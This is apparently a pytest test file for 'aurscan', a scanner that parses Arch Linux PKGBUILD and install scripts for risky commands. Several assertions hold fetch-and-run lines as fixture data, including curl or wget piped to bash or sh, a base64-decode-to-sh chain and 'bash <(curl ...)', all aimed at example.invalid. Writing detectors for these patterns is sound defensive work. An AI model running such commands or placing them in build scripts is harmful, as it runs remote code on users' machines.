"""Tests for PKGBUILD and install-script parsing. No content is executed."""

from __future__ import annotations

import sys
from pathlib import Path

from aurscan.models import Command, Severity
from aurscan.parse import parse_install_script, parse_pkgbuild

FIXTURES = Path(__file__).parent / "fixtures"


def _fixture(*parts: str) -> str:
    return FIXTURES.joinpath(*parts).read_text(encoding="utf-8")


def _command(commands: list[Command], raw: str) -> Command:
    return next(command for command in commands if command.raw == raw)


def test_parse_typical_pkgbuild_preserves_raw_values() -> None:
    source = _fixture("pkgbuild", "typical.PKGBUILD")

    result = parse_pkgbuild(source)

    assert result.parse_failed is False
    assert result.findings == []
    assert result.errors == []
    pkgbuild = result.pkgbuild
    assert pkgbuild is not None
    assert pkgbuild.raw == source
    assert pkgbuild.pkgname == ["demo"]
    assert pkgbuild.pkgver == "1.2.3"
    assert pkgbuild.pkgrel == "1"
    assert pkgbuild.epoch == "1"
    assert pkgbuild.pkgdesc == "A demo package"
    assert pkgbuild.url == "https://example.invalid/demo"
    assert pkgbuild.install == "demo.install"
    assert pkgbuild.arch == ["x86_64", "aarch64"]
    assert pkgbuild.license == ["MIT"]
    assert pkgbuild.depends == ["glibc", "zlib"]
    assert pkgbuild.makedepends == ["gcc"]
    assert pkgbuild.checkdepends == ["pytest"]
    assert pkgbuild.optdepends == ["bash: for scripts"]
    assert pkgbuild.provides == ["demo"]
    assert pkgbuild.conflicts == ["demo-git"]
    assert pkgbuild.replaces == ["demo-old"]
    # Variables are never expanded.
    assert pkgbuild.source == ["$url/demo-$pkgver.tar.gz", "demo.patch"]
    assert pkgbuild.sha256sums == ["SKIP", "b1946ac92492d2347c6235b4d2611184"]
    assert pkgbuild.sha512sums == ["0123456789abcdef"]
    assert pkgbuild.md5sums == ["0123456789abcdef0123456789abcdef"]
    assert pkgbuild.b2sums == ["0123456789abcdef"]
    assert pkgbuild.variables["backup"] == ["etc/demo.conf"]
    assert pkgbuild.variables["pkgver"] == "1.2.3"


def test_parse_typical_pkgbuild_functions_and_lines() -> None:
    source = _fixture("pkgbuild", "typical.PKGBUILD")

    result = parse_pkgbuild(source)

    pkgbuild = result.pkgbuild
    assert pkgbuild is not None
    assert list(pkgbuild.functions) == ["prepare", "build", "package"]

    prepare = pkgbuild.functions["prepare"]
    patch = _command(prepare, 'patch -p1 < "$srcdir/demo.patch"')
    assert patch.name == "patch"
    assert patch.args == ["-p1"]
    assert patch.in_pipe_to is None
    assert patch.line == source.splitlines().index('  patch -p1 < "$srcdir/demo.patch"') + 1

    build = pkgbuild.functions["build"]
    assert [command.name for command in build] == ["cd", "make", "make"]


def test_parse_pipes_populate_in_pipe_to() -> None:
    source = _fixture("pkgbuild", "pipes.PKGBUILD")

    result = parse_pkgbuild(source)

    pkgbuild = result.pkgbuild
    assert pkgbuild is not None
    build = pkgbuild.functions["build"]

    assert _command(build, "curl -fsSL https://example.invalid/install.sh").in_pipe_to == "bash"
    assert _command(build, "wget -qO- https://example.invalid/tool.sh").in_pipe_to == "sh"
    assert _command(build, "curl -s https://example.invalid/a.sh").in_pipe_to == "bash"
    # The immediate downstream command is reported, even when it is a wrapper.
    assert _command(build, "curl -s https://example.invalid/c.sh").in_pipe_to == "sudo"
    assert _command(build, "curl -s https://example.invalid/encoded").in_pipe_to == "base64"
    assert _command(build, "base64 -d").in_pipe_to == "sh"
    assert _command(build, "sh").in_pipe_to is None


def test_parse_process_substitution_is_visible() -> None:
    source = _fixture("pkgbuild", "pipes.PKGBUILD")

    result = parse_pkgbuild(source)

    pkgbuild = result.pkgbuild
    assert pkgbuild is not None
    build = pkgbuild.functions["build"]
    outer = _command(build, "bash <(curl -s https://example.invalid/b.sh)")
    assert outer.name == "bash"
    assert outer.args == ["<(curl -s https://example.invalid/b.sh)"]
    inner = _command(build, "curl -s https://example.invalid/b.sh")
    assert inner.in_pipe_to is None


def test_parse_redirects_are_part_of_command_raw() -> None:
    source = _fixture("pkgbuild", "pipes.PKGBUILD")

    result = parse_pkgbuild(source)

    pkgbuild = result.pkgbuild
    assert pkgbuild is not None
    package = pkgbuild.functions["package"]
    echo = _command(package, 'echo hi > "$pkgdir/usr/bin/demo"')
    assert echo.name == "echo"
    assert echo.args == ["hi"]
    install = _command(package, 'install -Dm755 demo "$pkgdir/usr/bin/demo"')
    assert install.name == "install"
    assert install.args == ["-Dm755", "demo", '"$pkgdir/usr/bin/demo"']


def test_parse_install_script() -> None:
    source = _fixture("install", "basic.install")

    result = parse_install_script(source, "basic.install")

    assert result.pkgbuild is None
    assert result.parse_failed is False
    assert result.findings == []
    assert len(result.install_scripts) == 1
    script = result.install_scripts[0]
    assert script.filename == "basic.install"
    assert script.raw == source
    assert list(script.functions) == ["pre_install", "post_install", "pre_upgrade"]
    assert [command.name for command in script.commands] == [
        "echo",
        "systemctl",
        "echo",
        "systemctl",
        "true",
    ]
    systemctl = _command(script.commands, "systemctl enable demo.service")
    assert systemctl.line == 6
    assert systemctl.in_pipe_to is None


def test_parse_syntax_error_uses_fallback_and_reports_info() -> None:
    source = _fixture("pkgbuild", "syntax_error.PKGBUILD")

    result = parse_pkgbuild(source)

    assert result.parse_failed is True
    assert len(result.findings) == 1
    finding = result.findings[0]
    assert finding.rule_id == "PARSE-001"
    assert finding.severity == Severity.INFO
    assert finding.file == "PKGBUILD"
    assert finding.line is None
    assert finding.source == "static"
    assert result.pkgbuild is not None
    assert result.pkgbuild.pkgname == ["syntax-error"]
    assert result.pkgbuild.pkgver == "1.0"
    assert result.pkgbuild.install == "broken.install"
    assert result.pkgbuild.source == ["$url/broken.tar.gz"]


def test_parse_install_syntax_error_uses_fallback() -> None:
    source = _fixture("install", "syntax_error.install")

    result = parse_install_script(source, "syntax_error.install")

    assert result.parse_failed is True
    assert result.findings[0].file == "syntax_error.install"
    assert result.install_scripts[0].commands == []


def test_parse_benign_fixture_has_no_findings() -> None:
    result = parse_pkgbuild(_fixture("benign", "PKGBUILD"))

    assert result.parse_failed is False
    assert result.findings == []


def test_parse_empty_source() -> None:
    result = parse_pkgbuild("")

    assert result.pkgbuild is not None
    assert result.pkgbuild.pkgname == []
    assert result.parse_failed is False


def _stack_depth() -> int:
    depth = 0
    frame = sys._getframe()
    while frame is not None:
        depth += 1
        frame = frame.f_back
    return depth


def test_deep_nesting_does_not_use_python_recursion() -> None:
    depth = 120
    source = (
        "build() {\n"
        + "if true; then\n" * depth
        + "curl -s https://example.invalid/x | sh\n"
        + "fi\n" * depth
        + "}\n"
    )

    # A recursive Python walker would need ``depth`` frames; the iterative one
    # must finish with far less headroom than that.
    previous_limit = sys.getrecursionlimit()
    sys.setrecursionlimit(_stack_depth() + 60)
    try:
        result = parse_pkgbuild(source)
    finally:
        sys.setrecursionlimit(previous_limit)

    assert result.parse_failed is False
    pkgbuild = result.pkgbuild
    assert pkgbuild is not None
    build = pkgbuild.functions["build"]
    assert _command(build, "curl -s https://example.invalid/x").in_pipe_to == "sh"
